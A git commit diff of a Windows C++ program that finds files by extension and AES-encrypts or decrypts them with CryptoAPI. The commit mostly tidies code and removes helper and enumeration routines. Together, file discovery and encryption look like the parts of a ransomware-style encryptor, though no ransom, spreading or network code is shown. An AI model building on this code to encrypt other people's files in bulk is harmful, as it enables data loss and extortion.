41ec0fe097a3f08f437f2a0cb0bbc972733bd225
k0z4c <matteo.sondrio@gmail.com>
2022-03-29 13:34:20 +0200

    Cleaning codebase

--- main.cpp
+++ main.cpp
@@ -1,92 +1,20 @@
 #include <iostream>
-#include <functional>
-#include <sstream>
-#include <iomanip>
-#include <queue>
-#include <Shlwapi.h>
-#include <tchar.h>
-#include <wchar.h>
 #include <Windows.h>
-#include <wincrypt.h>
+#include <Shlwapi.h>
+#include <queue>
 
 #pragma comment(lib, "Shlwapi.lib")
-
 #pragma comment(lib, "advapi32.lib")
 
-using FileEnumerator = std::function<bool(const std::string&)>;
 using namespace std; 
 
 #define AES_KEY_SIZE 16
 #define IN_CHUNK_SIZE (AES_KEY_SIZE * 10) // a buffer must be a multiple of the key size
 #define OUT_CHUNK_SIZE (IN_CHUNK_SIZE * 2) // an output buffer (for encryption) must be twice as big
 
-struct CloseHandleRAAI {
-    using Disposer = std::function<void()>;
-    Disposer m_dispose;
-    CloseHandleRAAI(Disposer dispose) : m_dispose(dispose) { }
-    ~CloseHandleRAAI() { m_dispose(); }
-};
-
-auto utf8_encode(const std::wstring& wstr) -> std::string
-{
-    int size_needed = WideCharToMultiByte(
-        CP_UTF8, 0, &wstr[0],
-        (int)wstr.size(), NULL, 0, NULL, NULL);
-    std::string strTo(size_needed, 0);
-    WideCharToMultiByte(
-        CP_UTF8, 0, &wstr[0],
-        (int)wstr.size(), &strTo[0], size_needed, NULL, NULL);
-    return strTo;
-}
-
-// Credits: https://gist.github.com/pezy/8571764
-auto utf8_decode(const std::string& str) -> std::wstring
-{
-    int size_needed = MultiByteToWideChar(
-        CP_UTF8, 0,
-        &str[0], (int)str.size(), NULL, 0);
-    std::wstring wstrTo(size_needed, 0);
-    MultiByteToWideChar(
-        CP_UTF8, 0, &str[0],
-        (int)str.size(), &wstrTo[0], size_needed);
-    return wstrTo;
-}
-
 void CloseHandleLog(HANDLE h, const std::string& name) {
     ::CloseHandle(h);
     std::cerr << " [LOG] Handler <" << name << "> closed OK." << std::endl;
-}
-
-auto EnumerateFiles(const std::string& path, FileEnumerator Enumerator) -> int {
-    WIN32_FIND_DATAW fdata;
-    HANDLE hFind = INVALID_HANDLE_VALUE;
-    // Ensure that resource hFind is always disposed. 
-    auto close_hFind = CloseHandleRAAI(std::bind(CloseHandleLog, hFind, "hFile"));
-    //hFind = FindFirstFileW(utf8_decode(path).c_str(), &fdata);
-
-    //////////
-    FINDEX_INFO_LEVELS info_level = FindExInfoStandard;
-    FINDEX_SEARCH_OPS search_op = FindExSearchNameMatch;
-
-    hFind = FindFirstFileEx(
-        utf8_decode(path).c_str(),
-        info_level, &fdata, search_op,
-        nullptr, 0);
-
-    if (hFind == INVALID_HANDLE_VALUE)
-        return GetLastError();
-
-
-    DWORD fattr;
-    std::queue<wchar_t> q;
-    LPWSTR fullpath = nullptr;
-    do {
-        
-        if (!Enumerator(utf8_encode(fdata.cFileName))) break;
-
-    } while (FindNextFileW(hFind, &fdata) != 0);
-    return ERROR_SUCCESS;
-
 }
 
 void encryptFile(const wchar_t* filename, const wchar_t* filename2, bool isDecrypt) {
@@ -104,31 +32,41 @@ void encryptFile(const wchar_t* filename, const wchar_t* filename2, bool isDecry
     const size_t len = lstrlenW(key_str);
     const size_t key_size = len * sizeof(key_str[0]); // size in bytes
 
-    std::cout << "Key: " <<  key_str << std::endl;
-    std::cout << "Key len: " << len << std::endl;
-    std::cout << "Key size: " << key_size << std::endl;
-    std::wcout << "Input File: " << filename << std::endl;
-    wcout << "Output File: " << filename2 << std::endl;
-    std::cout << "----\n";
+    cout << "Key: " <<  key_str << endl;
+    cout << "Key len: " << len << endl;
+    cout << "Key size: " << key_size << endl;
+    wcout << "Input File: " << filename << endl;
+    wcout << "Output File: " << filename2 << endl;
+    cout << "----\n";
 
-    HANDLE hInpFile = CreateFileW(filename, GENERIC_READ, FILE_SHARE_READ, NULL, OPEN_EXISTING, FILE_FLAG_SEQUENTIAL_SCAN, NULL);
+    HANDLE hInpFile = CreateFileW(
+        filename,
+        GENERIC_READ, FILE_SHARE_READ,
+        NULL, OPEN_EXISTING, FILE_FLAG_SEQUENTIAL_SCAN, NULL
+    );
+
     if (hInpFile == INVALID_HANDLE_VALUE) {
-        std::cout << "Cannot open input file!\n";
+        cout << "Cannot open input file!\n";
         system("pause");
         return;
     }
-    HANDLE hOutFile = CreateFileW(filename2, GENERIC_WRITE, 0, NULL, CREATE_ALWAYS, FILE_ATTRIBUTE_NORMAL, NULL);
+    HANDLE hOutFile = CreateFileW(
+        filename2,
+        GENERIC_WRITE, 0, NULL,
+        CREATE_ALWAYS, FILE_ATTRIBUTE_NORMAL, NULL
+    );
+
     if (hOutFile == INVALID_HANDLE_VALUE) {
-        std::cout << "Cannot open output file!\n";
+        cout << "Cannot open output file!\n";
         system("pause");
         return;
     }
 
     if (isDecrypt) {
-        std::cout << "DECRYPTING\n";
+        cout << "DECRYPTING\n";
     }
     else {
-        std::cout << "ENCRYPTING\n";
+        cout << "ENCRYPTING\n";
     }
 
     DWORD dwStatus = 0;
@@ -218,37 +156,6 @@ void encryptFile(const wchar_t* filename, const wchar_t* filename2, bool isDecry
     CloseHandle(hOutFile);
     std::cout << "Finished. Processed %#x bytes.\n" << readTotalSize << std::endl;
 }
-
-/*void FindFile(const std::wstring& directory)
-{
-    std::wstring tmp = directory + L"\\*";
-    WIN32_FIND_DATAW file;
-    HANDLE search_handle = FindFirstFileW(tmp.c_str(), &file);
-    if (search_handle != INVALID_HANDLE_VALUE)
-    {
-        std::vector<std::wstring> directories;
-
-        do
-        {
-            if (file.dwFileAttributes & FILE_ATTRIBUTE_DIRECTORY)
-            {
-                if ((!lstrcmpW(file.cFileName, L".")) || (!lstrcmpW(file.cFileName, L"..")))
-                    continue;
-            }
-
-            tmp = directory + L"\\" + std::wstring(file.cFileName);
-            std::wcout << tmp << std::endl;
-
-            if (file.dwFileAttributes & FILE_ATTRIBUTE_DIRECTORY)
-                directories.push_back(tmp);
-        } while (FindNextFileW(search_handle, &file));
-
-        FindClose(search_handle);
-
-        for (std::vector<std::wstring>::iterator iter = directories.begin(), end = directories.end(); iter != end; ++iter)
-            FindFile(*iter);
-    }
-}*/
 
 void FindFile(const std::wstring& directory, wstring ext, queue<wstring> &results)
 {
